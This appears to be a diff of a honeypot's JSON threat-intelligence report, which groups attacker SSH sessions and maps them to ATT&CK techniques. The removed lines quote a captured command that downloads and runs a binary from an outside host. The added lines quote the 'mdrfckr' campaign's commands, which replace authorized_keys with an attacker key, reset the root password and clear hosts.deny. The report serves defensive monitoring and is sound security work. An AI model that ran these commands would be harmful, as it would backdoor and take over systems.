@@ -1,117 +1,107 @@
 {
-  "generated_at": "2026-04-05T12:52:58.428991+00:00",
-  "total_sessions_with_commands": 3,
-  "total_clusters": 3,
-  "campaign_clusters": 0,
-  "singleton_clusters": 3,
-  "highest_severity": "NONE",
-  "active_campaigns": [],
+  "generated_at": "2026-04-05T14:33:33.846518+00:00",
+  "total_sessions_with_commands": 1,
+  "total_clusters": 1,
+  "campaign_clusters": 1,
+  "singleton_clusters": 1,
+  "highest_severity": "HIGH",
+  "active_campaigns": [
+    {
+      "cluster_id": "CLU-001",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1082",
+        "T1592",
+        "T1070",
+        "T1140",
+        "T1489",
+        "T1105"
+      ]
+    }
+  ],
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
+      ],
       "session_count": 1,
       "unique_ips": [
-        "47.107.147.159"
+        "72.253.251.7"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "7a1cd8327190beae",
+      "sequence_hash": "ae55221dde332dfd",
       "ttps": [
         {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
         },
         {
-          "id": "T1059.004",
-          "name": "Unix Shell"
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
         },
         {
           "id": "T1140",
           "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1489",
+          "name": "Service Stop"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
         }
       ],
       "representative_commands": [
-        "echo 1 > /dev/null && cat /bin/echo",
-        "nohup $SHELL -c \"curl http://8.210.122.125:60149/arm_linux -o /tmp/6OYqUmCfv6; if [ ! -f /tmp/6OYqUmCfv6 ]; then wget http://8.210.122.125:60149/arm_linux -O /tmp/6OYqUmCfv6; fi; if [ ! -f /tmp/6OYqUmCfv6 ]; then exec 6<>/dev/tcp/8.210.122.125/60149 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/6OYqUmCfv6 ; chmod +x /tmp/6OYqUmCfv6 && /tmp/6OYqUmCfv6 1B8o8cTmG9gcMQDaAO3T/CoPpKUPPP7E5hzeHDEF2ADl3/YmCaWkDi3m3uMA3gYyHN0e7MTxLQWjpQ4s8crsAN4DOBzeHOHE8i4Fo6UOLPfK7ADeAzAc3RnsxPIsBaOlDi/3yuAZwgAzBcIf5tjoLQqgrw",
-        "head -c 2612960 > /tmp/W36nKy0sh7",
-        "nohup $SHELL -c \"curl http://8.210.122.125:60149/arm_linux -o /tmp/6OYqUmCfv6; if [ ! -f /tmp/6OYqUmCfv6 ]; then wget http://8.210.122.125:60149/arm_linux -O /tmp/6OYqUmCfv6; fi; if [ ! -f /tmp/6OYqUmCfv6 ]; then exec 6<>/dev/tcp/8.210.122.125/60149 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/6OYqUmCfv6 ; chmod +x /tmp/6OYqUmCfv6 && /tmp/6OYqUmCfv6 1B8o8cTmG9gcMQDaAO3T/CoPpKUPPP7E5hzeHDEF2ADl3/YmCaWkDi3m3uMA3gYyHN0e7MTxLQWjpQ4s8crsAN4DOBzeHOHE8i4Fo6UOLPfK7ADeAzAc3RnsxPIsBaOlDi/3yuAZwgAzBcIf5tjoLQqgrw",
-        "(vLXXXELF",
-        "4(`X[ 6w?pl)UV_",
-        "X [ 6w?pl"
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "cat /proc/cpuinfo | grep name | wc -l",
+        "echo \"root:FqSDhGOYo7Qj\"|chpasswd|bash",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
       ],
       "members": [
         {
-          "session_id": "IR-25fe77fe3c6a",
-          "src_ip": "47.107.147.159",
+          "session_id": "IR-c04a9bcfdf10",
+          "src_ip": "72.253.251.7",
           "country": "",
           "isp": "",
           "command_count": 7,
-          "timestamp": "2026-04-05T10:44:24.581737Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "128.24.161.194"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "7063dece7cccf374",
-      "ttps": [],
-      "representative_commands": [
-        "hostname"
-      ],
-      "members": [
-        {
-          "session_id": "IR-13c37862dfda",
-          "src_ip": "128.24.161.194",
-          "country": "",
-          "isp": "",
-          "command_count": 1,
-          "timestamp": "2026-04-05T10:37:41.512747Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "128.24.161.194"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "dd291cd6294bafef",
-      "ttps": [
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        }
-      ],
-      "representative_commands": [
-        "uptime"
-      ],
-      "members": [
-        {
-          "session_id": "IR-bd8f80b80057",
-          "src_ip": "128.24.161.194",
-          "country": "",
-          "isp": "",
-          "command_count": 1,
-          "timestamp": "2026-04-05T10:57:08.090796Z"
+          "timestamp": "2026-04-05T13:34:55.746938Z"
         }
       ]
     }
